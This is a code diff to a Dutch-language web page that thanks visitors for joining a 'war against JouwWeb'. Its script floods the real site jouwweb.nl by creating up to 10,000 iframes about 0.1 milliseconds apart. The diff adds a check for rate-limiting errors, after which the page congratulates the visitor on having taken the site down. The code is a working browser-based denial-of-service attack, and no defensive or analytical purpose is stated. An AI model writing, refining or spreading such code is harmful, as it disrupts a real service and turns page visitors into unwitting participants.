@@ -69,7 +69,7 @@
 </head>
 <body>
 
-    <div class="glowing-text">Bedankt voor uw steun in de oorlog tegen JouwWeb</div>
+    <div class="glowing-text" id="mainText">Bedankt voor uw steun in de oorlog tegen JouwWeb</div>
     
     <div class="counter">
         <div class="label">Bijdrage:</div>
@@ -78,14 +78,31 @@
 
     <script>
         let iframeCount = 0;
+        let stopCreatingIframes = false;
 
         function updateIframeCount() {
             document.getElementById('iframeCount').textContent = iframeCount;
         }
 
+        function showErrorState() {
+            stopCreatingIframes = true;
+            iframeCount = "MAX";
+            updateIframeCount();
+            document.getElementById('mainText').textContent = "Danku, u heeft JouwWalg platgelegd, erg aardig!";
+        }
+
         function createIframeWithDelay(index) {
+            // Prevent further iframe creation if there's an error
+            if (stopCreatingIframes) return;
+
             let iframe = document.createElement('iframe');
             iframe.src = 'https://jouwweb.nl';
+            
+            // Listen for errors (like 429 - rate limiting)
+            iframe.onerror = function () {
+                showErrorState();
+            };
+            
             document.body.appendChild(iframe);
             iframeCount++; // Increment iframe counter
             updateIframeCount(); // Update the counter display
@@ -94,6 +111,7 @@
         function createIframesWithDelay() {
             let delay = 0.1; // Delay in milliseconds
             for (let i = 0; i < 10000; i++) {
+                if (stopCreatingIframes) break; // Stop the loop if we hit an error
                 setTimeout(() => {
                     createIframeWithDelay(i);
                 }, i * delay);
